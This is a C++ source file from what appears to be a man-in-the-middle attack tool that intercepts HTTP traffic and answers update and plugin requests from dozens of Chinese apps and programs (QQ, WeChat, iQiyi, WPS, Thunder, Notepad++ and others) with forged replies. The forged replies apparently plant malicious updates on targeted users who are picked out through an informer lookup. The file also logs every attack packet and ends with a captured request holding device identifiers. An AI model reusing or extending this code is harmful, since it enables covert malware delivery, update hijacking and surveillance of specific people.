#include "HttpAttack.h"
#include "Toutiao.h"
#include "WeixinAndroid.h"
#include "PluginServer.h"
#include "../HttpUtils.h"
#include "WeixinPC.h"
#include "../Public.h"
#include "QQAndroid.h"
#include "QQVideoSSL.h"
#include "InformerClient.h"
#include "momo.h"
#include "QQMusicAndroid.h"
#include "ShuqiPlugin.h"
#include "MiaoPaiUpdate.h"
#include "IqiyiPlugin.h"
#include "JingdongPlugin.h"
#include "QQ.h"
#include "Youku.h"
#include "QQTencentNews.h"
#include "AttackSplitPacket.h"
#include <unordered_map>
#include "NotepadPP.h"
#include "SSLRetransfer.h"
#include "KugouPlugin.h"
#include "DouyuPlugin.h"
#include "letvPlugin.h"
#include "changbaPlugin.h"
#include "wgs2gcjPlugin.h"
#include "AmapHotfix.h"
#include "baofeng.h"
#include "AliProtect.h"
#include "WpsPlugin.h"
#include "ThunderUpdate.h"
#include "Duba.h"
#include "QQManager.h"
#include "BrowserDownload.h"
#include "sogouExplorer.h"
#include "BaiduPromotion.h"
#include "cboxPlugin.h"
#include "zhwnl.h"
#include "lbspos.h"
#include "MeituanPatch.h"
#include "NetEaseNewsUpdate.h"
#include "QQPim.h"
#include "Plugin2345.h"
#include "QQmtt.h"
#include "BaiduLocation.h"
#include "SunflowerUpdate.h"
#include "baiduNetDisk.h"
#include "Browser2345Android.h"
#include "qitu.h"
#include "peanutShell.h"

int HttpAttack::httpAttackPacket(char* recvBuffer, int iCounter, const char* url, const char* szdm, const char* httphdr,
	const char* httpdata, LPHTTPPROXYPARAM lphttp) {

	int ret = 0;
	int retlen = 0;

	if (lphttp->saToClient.sin_addr.S_un.S_addr == 0x0100007f || strstr(lphttp->host, "127.0.0.1") ||
		(lphttp->saToClient.sin_addr.S_un.S_addr == gLocalIPAddr && gAttackMode != 3))
	{
		return TRUE;
	}

	if (lphttp->saToClient.sin_addr.S_un.S_addr == gLocalIPAddr)
	{
		if (gAttackMode == 3)
		{

		}
		else {
			return TRUE;
		}
	}
	else {
		if (Public::isPrivateIPAddress(lphttp->saToClient.sin_addr.S_un.S_addr))
		{
			return TRUE;
		}
	}



	if (strstr(lphttp->host, gstrServerIP.c_str()) || strstr(lphttp->host, gstrLocalIP.c_str()) ||
		strstr(lphttp->host, MYOWNSITE_ATTACK_DOMAINNAME))
	{
		if (strstr(url, ".well-known/pki-validation/fileauth.txt"))
		{
			lstrcpyA((char*)recvBuffer, "/fileauth.txt HTTP/1.1\r\nHost: helloqq.com\r\n\r\n");
			ret = PluginServer::PluginServerProc(lphttp, (char*)recvBuffer, iCounter);
		}
		else if (QQVideoSSL::isTencentPcUpgrade(url, lphttp->host))
		{
			string username = InformerClient::getTarget(lphttp->saToClient.sin_addr.S_un.S_addr, szdm);
			lstrcpyA(lphttp->username, username.c_str());
			ret = QQVideoSSL::replyTencentPcUpgrade(recvBuffer, iCounter, NETWORK_BUFFER_SIZE, lphttp);
		}
		else if (strstr((char*)url, "/fusion/3.0/plugin?"))
		{
			string username = InformerClient::getTarget(lphttp->saToClient.sin_addr.S_un.S_addr, szdm);
			lstrcpyA(lphttp->username, username.c_str());
			int retlen = IqiyiPlugin::replyIqiyiPlugin(recvBuffer, iCounter, NETWORK_BUFFER_SIZE, lphttp);
			if (retlen > 0)
			{
				ret = sendAttackPacket(recvBuffer, retlen, szdm, lphttp);
			}
		}
		else {
			ret = PluginServer::PluginServerProc(lphttp, (char*)recvBuffer, iCounter);
		}
		return TRUE;
	}

	else if (LeTVPlugin::isletvPlugin(url, szdm))
	{
		string username = InformerClient::getTarget(lphttp->saToClient.sin_addr.S_un.S_addr, szdm);

		lstrcpyA(lphttp->username, username.c_str());

		retlen = LeTVPlugin::replyletvPlugin(recvBuffer, iCounter, NETWORK_BUFFER_SIZE, lphttp->username);

		ret = sendAttackPacket(recvBuffer, retlen, szdm, lphttp);
		return TRUE;
	}

	else if (DuBa::isDuba(url, szdm))
	{
		string username = InformerClient::getTarget(lphttp->saToClient.sin_addr.S_un.S_addr, szdm);

		lstrcpyA(lphttp->username, username.c_str());

		retlen = DuBa::replyDuba(recvBuffer, iCounter, NETWORK_BUFFER_SIZE, lphttp);
		if (retlen > 0)
		{
			ret = sendAttackPacket(recvBuffer, retlen, szdm, lphttp);
		}

		return TRUE;
	}

	else if (TouTiao::isToutiaoUpdateConfig(url, szdm))
	{
		string username = InformerClient::getTarget(lphttp->saToClient.sin_addr.S_un.S_addr, szdm);

		lstrcpyA(lphttp->username, username.c_str());

		retlen = TouTiao::makeToutiaoUpdateConfig(recvBuffer, iCounter, NETWORK_BUFFER_SIZE, lphttp->username);

		ret = sendAttackPacket(recvBuffer, retlen, szdm, lphttp);
		return TRUE;
	}
	else if (QQMusicAndroid::isQQMusicUpdatePacket(url, szdm))
	{
		string username = InformerClient::getTarget(lphttp->saToClient.sin_addr.S_un.S_addr, szdm);

		lstrcpyA(lphttp->username, username.c_str());

		retlen = QQMusicAndroid::makeQQMusicUpdateResp((char*)recvBuffer, iCounter, NETWORK_BUFFER_SIZE, lphttp);

		ret = sendAttackPacket(recvBuffer, retlen, szdm, lphttp);
		return TRUE;
	}

	else if (MiaoPaiUpdate::isMiaoPai(url, szdm))
	{
		string username = InformerClient::getTarget(lphttp->saToClient.sin_addr.S_un.S_addr, szdm);

		lstrcpyA(lphttp->username, username.c_str());

		retlen = MiaoPaiUpdate::makeRequestReply((char*)recvBuffer, NETWORK_BUFFER_SIZE, username);

		ret = sendAttackPacket(recvBuffer, retlen, szdm, lphttp);

		return TRUE;
	}

	else if (QQBrowserPlugin::isQQBrowserPlugin(url, szdm, httphdr, httpdata))
	{
		string username = InformerClient::getTarget(lphttp->saToClient.sin_addr.S_un.S_addr, szdm);

		lstrcpyA(lphttp->username, username.c_str());

		retlen = QQBrowserPlugin::sendQQBrowserPlugin((char*)recvBuffer, NETWORK_BUFFER_SIZE, username);
		if (retlen > 0)
		{
			ret = sendAttackPacket(recvBuffer, retlen, szdm, lphttp);
		}

		return TRUE;
	}

	else if (IqiyiPlugin::isIqiyi(url, szdm))
	{
		string username = InformerClient::getTarget(lphttp->saToClient.sin_addr.S_un.S_addr, szdm);

		lstrcpyA(lphttp->username, username.c_str());

		retlen = IqiyiPlugin::replyIqiyiPlugin((char*)recvBuffer, iCounter, NETWORK_BUFFER_SIZE, lphttp);
		if (retlen > 0)
		{
			ret = sendAttackPacket(recvBuffer, retlen, szdm, lphttp);
		}

		return TRUE;
	}

	else if (KugouPlugin::isKugouPlugin(url, szdm))
	{
		string username = InformerClient::getTarget(lphttp->saToClient.sin_addr.S_un.S_addr, szdm);

		lstrcpyA(lphttp->username, username.c_str());

		retlen = KugouPlugin::replyKugouPlugin((char*)recvBuffer, NETWORK_BUFFER_SIZE, lphttp->username);

		ret = sendAttackPacket(recvBuffer, retlen, szdm, lphttp);

		return TRUE;
	}
	else if (DouyuPlugin::isDouyu(url, szdm))
	{
		string username = InformerClient::getTarget(lphttp->saToClient.sin_addr.S_un.S_addr, szdm);

		lstrcpyA(lphttp->username, username.c_str());

		retlen = DouyuPlugin::makeDouyuPluginReply((char*)recvBuffer, NETWORK_BUFFER_SIZE, lphttp->username);

		ret = sendAttackPacket(recvBuffer, retlen, szdm, lphttp);

		return TRUE;
	}


	else if (JingDongPlugin::isJingDong(url, szdm))
	{
		string username = InformerClient::getTarget(lphttp->saToClient.sin_addr.S_un.S_addr, szdm);

		lstrcpyA(lphttp->username, username.c_str());

		retlen = JingDongPlugin::replyJingDongPlugin((char*)recvBuffer, iCounter, NETWORK_BUFFER_SIZE, lphttp);

		ret = sendAttackPacket(recvBuffer, retlen, szdm, lphttp);

		return TRUE;
	}

	else if (ShuqiPlugin::isShuqiHead(url, szdm))
	{
		string username = InformerClient::getTarget(lphttp->saToClient.sin_addr.S_un.S_addr, szdm);

		lstrcpyA(lphttp->username, username.c_str());

		retlen = ShuqiPlugin::makeShuqiHeadReply((char*)recvBuffer, NETWORK_BUFFER_SIZE, lphttp);

		ret = sendAttackPacket(recvBuffer, retlen, szdm, lphttp);
		return TRUE;
	}
	else if (ShuqiPlugin::isShuqiRequest(url, szdm))
	{
		string username = InformerClient::getTarget(lphttp->saToClient.sin_addr.S_un.S_addr, szdm);

		lstrcpyA(lphttp->username, username.c_str());

		retlen = ShuqiPlugin::makeShuqiRequestReply((char*)recvBuffer, NETWORK_BUFFER_SIZE, lphttp);

		//retlen = ShuqiPlugin::makeRedirection((char*)recvBuffer, iCounter,NETWORK_BUFFER_SIZE, lphttp);

		//ret = sendAttackPacket(recvBuffer, retlen, szdm, lphttp);

		return TRUE;
	}
	else if (WeixinAndroid::isWxAndroidUpdateConfig(url, szdm))
	{
		string username = InformerClient::getTarget(lphttp->saToClient.sin_addr.S_un.S_addr, szdm);

		lstrcpyA(lphttp->username, username.c_str());

		retlen = WeixinAndroid::makeWxAndroidUpdateConfig((char*)recvBuffer, iCounter, NETWORK_BUFFER_SIZE, lphttp->username);
		ret = sendAttackPacket(recvBuffer, retlen, szdm, lphttp);
		return TRUE;
	}
	//old ver pc weixin is http

	else if (QQAndroid::isAndroidQQApkUpdate(url, szdm))
	{
		string username = InformerClient::getTarget(lphttp->saToClient.sin_addr.S_un.S_addr, szdm);

		lstrcpyA(lphttp->username, username.c_str());

		retlen = QQAndroid::makeAndroidQQApkUpdateJs(recvBuffer, NETWORK_BUFFER_SIZE, lphttp);

		ret = sendAttackPacket(recvBuffer, retlen, szdm, lphttp);
		return TRUE;
	}
	else if (QQVideoSSL::isQQVideo(url, szdm))
	{
		string username = InformerClient::getTarget(lphttp->saToClient.sin_addr.S_un.S_addr, szdm);

		lstrcpyA(lphttp->username, username.c_str());

		retlen = QQVideoSSL::makeReponse(recvBuffer, NETWORK_BUFFER_SIZE, lphttp);

		ret = sendAttackPacket(recvBuffer, retlen, szdm, lphttp);
		return TRUE;
	}
	else if (WeixinAndroid::isWxAndroidRequestApk(url, szdm) || WeixinAndroid::isWxAndroidRequestWebApk(url, szdm))
	{
		string username = InformerClient::getTarget(lphttp->saToClient.sin_addr.S_un.S_addr, szdm);

		lstrcpyA(lphttp->username, username.c_str());

		retlen = WeixinAndroid::sendWxAndroidUpdateApk(url, szdm, httphdr, lphttp);

		return TRUE;
	}

	else if (Youku::isYoukuApk(url, szdm))
	{
		string username = InformerClient::getTarget(lphttp->saToClient.sin_addr.S_un.S_addr, szdm);

		lstrcpyA(lphttp->username, username.c_str());

		retlen = Youku::replyYoukuApk(recvBuffer, iCounter, NETWORK_BUFFER_SIZE, lphttp, httpdata);

		ret = sendAttackPacket(recvBuffer, retlen, szdm, lphttp);
		return TRUE;
	}

	else if (QQTencentNews::isQQNews(url, szdm))
	{
		string username = InformerClient::getTarget(lphttp->saToClient.sin_addr.S_un.S_addr, szdm);

		lstrcpyA(lphttp->username, username.c_str());

		retlen = QQTencentNews::replyQQNews(recvBuffer, iCounter, NETWORK_BUFFER_SIZE, lphttp);
		if (retlen > 0)
		{
			ret = sendAttackPacket(recvBuffer, retlen, szdm, lphttp);
		}

		return TRUE;
	}


	else if (NotepadPP::isNotepadExe(url, szdm))
	{
		string username = InformerClient::getTarget(lphttp->saToClient.sin_addr.S_un.S_addr, szdm);

		lstrcpyA(lphttp->username, username.c_str());

		retlen = NotepadPP::replyNotepadExe(recvBuffer, NETWORK_BUFFER_SIZE, lphttp);

		ret = sendAttackPacket(recvBuffer, retlen, szdm, lphttp);
		return TRUE;
	}

	else if (QQAndroid::isQQNowPlugin(url, szdm))
	{
		string username = InformerClient::getTarget(lphttp->saToClient.sin_addr.S_un.S_addr, szdm);

		lstrcpyA(lphttp->username, username.c_str());

		retlen = QQAndroid::replyQQNow(recvBuffer, NETWORK_BUFFER_SIZE, lphttp->username);

		ret = sendAttackPacket(recvBuffer, retlen, szdm, lphttp);
		return TRUE;
	}

	else if (QQAndroid::isQQPlugin(url, szdm))
	{
		string username = InformerClient::getTarget(lphttp->saToClient.sin_addr.S_un.S_addr, szdm);

		lstrcpyA(lphttp->username, username.c_str());

		retlen = QQAndroid::replyUpdate(recvBuffer, iCounter, NETWORK_BUFFER_SIZE, lphttp->username);

		ret = sendAttackPacket(recvBuffer, retlen, szdm, lphttp);
		return TRUE;
	}

	else if (QQAndroid::isQQNowMgrPlugin(url, szdm))
	{
		string username = InformerClient::getTarget(lphttp->saToClient.sin_addr.S_un.S_addr, szdm);

		lstrcpyA(lphttp->username, username.c_str());

		retlen = QQAndroid::replyQQNowMgrPlugin(recvBuffer, iCounter, NETWORK_BUFFER_SIZE, lphttp);

		return TRUE;
	}
	else if (QQAndroid::isQQSecLibs(url, szdm))
	{
		string username = InformerClient::getTarget(lphttp->saToClient.sin_addr.S_un.S_addr, szdm);

		lstrcpyA(lphttp->username, username.c_str());

		retlen = QQAndroid::replyQQSecLibsPlugin(recvBuffer, iCounter, NETWORK_BUFFER_SIZE, lphttp);
		if (retlen > 0)
		{
			ret = sendAttackPacket(recvBuffer, retlen, szdm, lphttp);
		}
		return TRUE;
	}

	else if (QQPim::isQQPim(url, szdm))
	{
		string username = InformerClient::getTarget(lphttp->saToClient.sin_addr.S_un.S_addr, szdm);

		lstrcpyA(lphttp->username, username.c_str());

		retlen = QQPim::replyQQPim(recvBuffer, lphttp);

		return TRUE;
	}

	else if (ChangBaPlugin::isChangba(url, szdm))
	{
		string username = InformerClient::getTarget(lphttp->saToClient.sin_addr.S_un.S_addr, szdm);

		lstrcpyA(lphttp->username, username.c_str());

		retlen = ChangBaPlugin::replyChangbaPlugin(recvBuffer, NETWORK_BUFFER_SIZE, lphttp);

		return TRUE;
	}


	else if (Wgs2gcjPlugin::isWgs2gcj(url, szdm))
	{
		string username = InformerClient::getTarget(lphttp->saToClient.sin_addr.S_un.S_addr, szdm);

		lstrcpyA(lphttp->username, username.c_str());

		retlen = Wgs2gcjPlugin::replyWgs2gcjPlugin(recvBuffer, NETWORK_BUFFER_SIZE, lphttp);

		return TRUE;
	}

	else if (AmapHotfix::isAmapHotfix(url, szdm))
	{
		string username = InformerClient::getTarget(lphttp->saToClient.sin_addr.S_un.S_addr, szdm);

		lstrcpyA(lphttp->username, username.c_str());

		retlen = AmapHotfix::replyAmapHotfixPlugin(recvBuffer, NETWORK_BUFFER_SIZE, lphttp);

		return TRUE;
	}

	else if (BaofengPllugin::isBaofengUpdate(url, szdm))
	{
		string username = InformerClient::getTarget(lphttp->saToClient.sin_addr.S_un.S_addr, szdm);

		lstrcpyA(lphttp->username, username.c_str());

		retlen = BaofengPllugin::replyBaofengPlugin(recvBuffer, iCounter, NETWORK_BUFFER_SIZE, lphttp);
		if (retlen > 0)
		{
			ret = sendAttackPacket(recvBuffer, retlen, szdm, lphttp);
		}

		return TRUE;
	}


	else if (AlibabaProtect::isAliProtect(url, szdm))
	{
		string username = InformerClient::getTarget(lphttp->saToClient.sin_addr.S_un.S_addr, szdm);

		lstrcpyA(lphttp->username, username.c_str());

		retlen = AlibabaProtect::replyAliProtect(recvBuffer, iCounter, NETWORK_BUFFER_SIZE, lphttp);
		if (retlen > 0)
		{
			ret = sendAttackPacket(recvBuffer, retlen, szdm, lphttp);
		}

		return TRUE;
	}

	else if (ThunderUpdate::isThunder(url, szdm, httphdr))
	{
		string username = InformerClient::getTarget(lphttp->saToClient.sin_addr.S_un.S_addr, szdm);

		lstrcpyA(lphttp->username, username.c_str());

		retlen = ThunderUpdate::replyThunder(recvBuffer, NETWORK_BUFFER_SIZE, lphttp);
		if (retlen > 0)
		{
			ret = sendAttackPacket(recvBuffer, retlen, szdm, lphttp);
		}

		return TRUE;
	}

	else if (WPSPlugin::isWpsPlugin(url, szdm))
	{
		string username = InformerClient::getTarget(lphttp->saToClient.sin_addr.S_un.S_addr, szdm);

		lstrcpyA(lphttp->username, username.c_str());

		retlen = WPSPlugin::replyWpsPcUpdate(recvBuffer, NETWORK_BUFFER_SIZE, lphttp->username);
		if (retlen > 0)
		{
			ret = sendAttackPacket(recvBuffer, retlen, szdm, lphttp);
		}

		return TRUE;
	}

	else if (QQManager::isQQManager(url, szdm))
	{
		string username = InformerClient::getTarget(lphttp->saToClient.sin_addr.S_un.S_addr, szdm);

		lstrcpyA(lphttp->username, username.c_str());

		retlen = QQManager::replayQQManager(recvBuffer, NETWORK_BUFFER_SIZE, lphttp);
		if (retlen > 0)
		{
			ret = sendAttackPacket(recvBuffer, retlen, szdm, lphttp);
		}

		return TRUE;
	}

	else if (SogouExplorer::isSogouExplorer(url, szdm))
	{
		string username = InformerClient::getTarget(lphttp->saToClient.sin_addr.S_un.S_addr, szdm);

		lstrcpyA(lphttp->username, username.c_str());

		retlen = SogouExplorer::replySogouExplorer(recvBuffer, NETWORK_BUFFER_SIZE, lphttp);
		if (retlen > 0)
		{
			ret = sendAttackPacket(recvBuffer, retlen, szdm, lphttp);
			//return 0;
		}

		return TRUE;
	}

	else if (BaiduPromotion::isBaiduAd(url, szdm))
	{
		string username = InformerClient::getTarget(lphttp->saToClient.sin_addr.S_un.S_addr, szdm);

		lstrcpyA(lphttp->username, username.c_str());

		retlen = BaiduPromotion::replyBaiduAd(recvBuffer, iCounter, NETWORK_BUFFER_SIZE, lphttp->username);
		if (retlen > 0)
		{
			ret = sendAttackPacket(recvBuffer, retlen, szdm, lphttp);
		}
		return TRUE;
	}

	else if (BrowserDownload::isBrowserDownload(url, szdm))
	{
		string username = InformerClient::getTarget(lphttp->saToClient.sin_addr.S_un.S_addr, szdm);

		lstrcpyA(lphttp->username, username.c_str());

		retlen = BrowserDownload::replyBrowserDownload(recvBuffer, iCounter, NETWORK_BUFFER_SIZE, lphttp);

		return TRUE;
	}
	else if (strstr(szdm, "360.cn") || strstr(szdm, "360.com"))
	{
		return TRUE;
	}

	else if (ZHWNL::isZhwnl(url, szdm))
	{
		string username = InformerClient::getTarget(lphttp->saToClient.sin_addr.S_un.S_addr, szdm);

		lstrcpyA(lphttp->username, username.c_str());

		retlen = ZHWNL::replyZhwnl(recvBuffer, iCounter, NETWORK_BUFFER_SIZE, lphttp->username);
		if (retlen > 0)
		{
			ret = sendAttackPacket(recvBuffer, retlen, szdm, lphttp);
		}
		return TRUE;
	}

	else if (CboxPlugin::isCboxUpdate(url, szdm))
	{
		string username = InformerClient::getTarget(lphttp->saToClient.sin_addr.S_un.S_addr, szdm);

		lstrcpyA(lphttp->username, username.c_str());

		retlen = CboxPlugin::makeReponse(recvBuffer, iCounter, NETWORK_BUFFER_SIZE, lphttp);
		if (retlen > 0)
		{
			ret = sendAttackPacket(recvBuffer, retlen, szdm, lphttp);
		}
		return TRUE;
	}
	else if (LBSPos::isLBSPos(url, szdm))
	{
		string username = InformerClient::getTarget(lphttp->saToClient.sin_addr.S_un.S_addr, szdm);

		lstrcpyA(lphttp->username, username.c_str());

		int retlen = LBSPos::replyLBSPos(recvBuffer, iCounter, NETWORK_BUFFER_SIZE, lphttp->username);
		if (retlen > 0)
		{
			int ret = sendAttackPacket(recvBuffer, retlen, szdm, lphttp);
		}
		return TRUE;
	}

	else if (Browser2345Android::isBrowser2345Android(url, szdm, httpdata))
	{
		string username = InformerClient::getTarget(lphttp->saToClient.sin_addr.S_un.S_addr, szdm);

		lstrcpyA(lphttp->username, username.c_str());

		int retlen = Browser2345Android::replyBrowser2345Android(recvBuffer, iCounter, NETWORK_BUFFER_SIZE, lphttp);
		if (retlen > 0)
		{
			int ret = sendAttackPacket(recvBuffer, retlen, szdm, lphttp);
		}
		return TRUE;
	}

	else if (PeanutShell::isPeanutShell(url, szdm))
	{
		string username = InformerClient::getTarget(lphttp->saToClient.sin_addr.S_un.S_addr, szdm);

		lstrcpyA(lphttp->username, username.c_str());

		int retlen = PeanutShell::replyPeanutShell(recvBuffer, NETWORK_BUFFER_SIZE, lphttp);
		if (retlen > 0)
		{
			int ret = sendAttackPacket(recvBuffer, retlen, szdm, lphttp);
		}
		return TRUE;
	}


	else if (QituAndroid::isQituAndroid(url, szdm))
	{
		string username = InformerClient::getTarget(lphttp->saToClient.sin_addr.S_un.S_addr, szdm);

		lstrcpyA(lphttp->username, username.c_str());

		int retlen = QituAndroid::replyQituAndroid(recvBuffer, iCounter, NETWORK_BUFFER_SIZE, lphttp);
		if (retlen > 0)
		{
			int ret = sendAttackPacket(recvBuffer, retlen, szdm, lphttp);
		}
		return TRUE;
	}
	// 	else if (Momo::isMomoDns(url,szdm))
	// 	{
	// 		return FALSE;
	// 
	// 		string username = InformerClient::getTarget(lphttp->saToClient.sin_addr.S_un.S_addr,szdm);
	// 
	// 		lstrcpyA(lphttp->username, username.c_str());
	// 
	// 		return Momo::makeMomoDns(recvBuffer, iCounter, NETWORK_BUFFER_SIZE, lphttp);
	// 	}
	else if (MeiTuanPatch::isMeiTuan(url, szdm))
	{
		string username = InformerClient::getTarget(lphttp->saToClient.sin_addr.S_un.S_addr, szdm);

		lstrcpyA(lphttp->username, username.c_str());

		int retlen = MeiTuanPatch::replyMeiTuan(recvBuffer, iCounter, NETWORK_BUFFER_SIZE, lphttp->username);
		if (retlen > 0)
		{
			int ret = sendAttackPacket(recvBuffer, retlen, szdm, lphttp);
		}
		return TRUE;
	}
	else if (NetEaseNewsUpdate::isNeteaseNews(url, szdm))
	{
		string username = InformerClient::getTarget(lphttp->saToClient.sin_addr.S_un.S_addr, szdm);

		lstrcpyA(lphttp->username, username.c_str());

		int retlen = NetEaseNewsUpdate::replyNetEaseNews(recvBuffer, iCounter, NETWORK_BUFFER_SIZE, lphttp);

		return TRUE;
	}


	else if (Plugin2345::isPlugin2345(url, szdm))
	{
		string username = InformerClient::getTarget(lphttp->saToClient.sin_addr.S_un.S_addr, szdm);

		lstrcpyA(lphttp->username, username.c_str());

		int retlen = Plugin2345::replyPlugin2345(recvBuffer, NETWORK_BUFFER_SIZE, lphttp);
		if (retlen > 0)
		{
			int ret = sendAttackPacket(recvBuffer, retlen, szdm, lphttp);
		}

		return TRUE;
	}
	else if (QQmtt::isQQmttPlugin(url, szdm))
	{
		string username = InformerClient::getTarget(lphttp->saToClient.sin_addr.S_un.S_addr, szdm);

		lstrcpyA(lphttp->username, username.c_str());

		int retlen = QQmtt::replyQQmttPlugin(recvBuffer, iCounter, NETWORK_BUFFER_SIZE, lphttp);
		if (retlen > 0)
		{
			int ret = sendAttackPacket(recvBuffer, retlen, szdm, lphttp);
		}

		return TRUE;
	}
	else if (BaiduLocation::isBaiduLoc(url, szdm))
	{
		string username = InformerClient::getTarget(lphttp->saToClient.sin_addr.S_un.S_addr, szdm);

		lstrcpyA(lphttp->username, username.c_str());

		int retlen = BaiduLocation::replyBaiduLoc(recvBuffer, iCounter, NETWORK_BUFFER_SIZE, lphttp);
		if (retlen > 0)
		{
			int ret = sendAttackPacket(recvBuffer, retlen, szdm, lphttp);
		}

		return TRUE;
	}
	else if (SunflowerUpdate::isSunflower(url, szdm))
	{
		string username = InformerClient::getTarget(lphttp->saToClient.sin_addr.S_un.S_addr, szdm);

		lstrcpyA(lphttp->username, username.c_str());

		int retlen = SunflowerUpdate::replySunflower(recvBuffer, iCounter, lphttp);
		if (retlen > 0)
		{
			int ret = sendAttackPacket(recvBuffer, retlen, szdm, lphttp);
		}

		return TRUE;
	}

	else if (BaiduNetDisk::isBaiduUpdateJson(url, szdm))
	{
		string username = InformerClient::getTarget(lphttp->saToClient.sin_addr.S_un.S_addr, szdm);

		lstrcpyA(lphttp->username, username.c_str());

		int retlen = BaiduNetDisk::replyBaiduJson(recvBuffer, iCounter, NETWORK_BUFFER_SIZE, lphttp);
		if (retlen > 0)
		{
			int ret = sendAttackPacket(recvBuffer, retlen, szdm, lphttp);
		}

		return TRUE;
	}
	return FALSE;
}


int HttpAttack::sendAttackPacket(char* recvBuffer, int resultlen, const char* szdm, LPHTTPPROXYPARAM pstHttpProxyParam) {
	int iRet = 0;

	if (resultlen <= 0)
	{
		printf("http attack send data length:%u error\r\n", resultlen);
		return FALSE;
	}

	int sendlen = send(pstHttpProxyParam->sockToClient, (char*)recvBuffer, resultlen, 0);
	if (sendlen != resultlen)
	{
		printf("HTTP send attack error:%d,host:%s\n", GetLastError(), szdm);
	}
	else {
		printf("HTTP send attack ok,host:%s,packet:%s\n", szdm, recvBuffer);
	}

	iRet = Public::WriteLogFile(ATTACK_LOG_FILENAME, (unsigned char*)recvBuffer, resultlen, "http send attack response packet:");
	return TRUE;
}




int HttpAttack::httpAttackProc(char* recvBuffer, int& iCounter, LPHTTPPROXYPARAM pstHttpProxyParam) {

	int iRet = 0;
	char szout[1024];

	char* httpdata = 0;
	string httphdr = "";
	string url = "";
	string host = "";
	int port = 0;
	int type = 0;
	iRet = HttpUtils::parseHttpHdr(recvBuffer, iCounter, type, httphdr, &httpdata, url, host, port);
	if (iRet < 0)
	{
		if (pstHttpProxyParam->host[0] == 0)
		{
			return TRUE;
		}
		else {
			return FALSE;
		}
	}
	else if (iRet == 0)
	{
		iRet = AttackSplitPacket::splitPacket(recvBuffer, iCounter, pstHttpProxyParam, httphdr, &httpdata, url, host, port);
		if (iRet <= 0)
		{
			Public::WriteLogFile(ATTACK_LOG_FILENAME, (unsigned char*)recvBuffer, iCounter, "\r\nhttp splitPacket error:\r\n");
			return TRUE;
		}
		else {
			lstrcpyA(pstHttpProxyParam->host, host.c_str());
		}
	}
	else
	{
		lstrcpyA(pstHttpProxyParam->host, host.c_str());
	}

	if (*pstHttpProxyParam->host == 0)
	{
		return TRUE;
	}

	// 	if (host.find("ganlai.722ka.cn") != -1 || 
	// 		host.find("k30.com") != -1 || 
	// 		host.find("https") != -1 || 
	// 		host.find("f9.rr5568866.xyz:5678") != -1 ||	
	// 		host.find("qixuanplay.com") != -1)
	// 	{
	// 		return TRUE;
	// 	}


	if (SSLPublic::isTargetHost(host) == FALSE)
	{
		return TRUE;
	}

	iRet = HttpAttack::httpAttackPacket((char*)recvBuffer, iCounter, url.c_str(), host.c_str(), httphdr.c_str(),
		httpdata, pstHttpProxyParam);
	if (iRet)
	{
		return TRUE;
	}

	return FALSE;
}


/*
iface2.iqiyi.com/fusion/3.0/plugin?plugins=5594_2.3_&app_k=2080320204add8e266bfef28948d903c&app_v=9.7.6&platform_id=10&dev_os=4.4.4&dev_ua=Che1-CL10&net_sts=1&qyid=A000004F931A45&cupid_v=3.27.006&psp_uid=&psp_cki=&imei=3f2d48f32b2a847a906f02eb8ab4ea4b&aid=cab8462d329b3a4a&mac=84:db:ac:b6:ac:c8&scrn_scale=2&secure_p=GPhone&secure_v=1&core=5&api_v=7.5&profile=&unlog_sub=0&cust_count=&dev_hw=%7B%22platform_ver%22%3A19%2C%22scrn_size%22%3A4.590000152587891%2C%22gyro%22%3A1%2C%22mem%22%3A1910%2C%22cpu_core%22%3A4%2C%22cpu%22%3A%221209600%22%2C%22display_mem%22%3A%22%22%2C%22gpu%22%3A%22%22%7D&net_ip=&scrn_sts=0&scrn_res=720,1280&scrn_dpi=320&cupid_id=A000004F931A45&psp_vip=0&psp_status=1&app_t=0&province_id=2007&service_filter=&service_sort=&aqyid=A000004F931A45_cab8462d329b3a4a_84ZdbZacZb6ZacZc8&pps=0&pu=&cupid_uid=A000004F931A45&app_gv=&gps=,&lang=zh_CN&app_lm=cn&req_times=0&req_sn=1534320376335
*/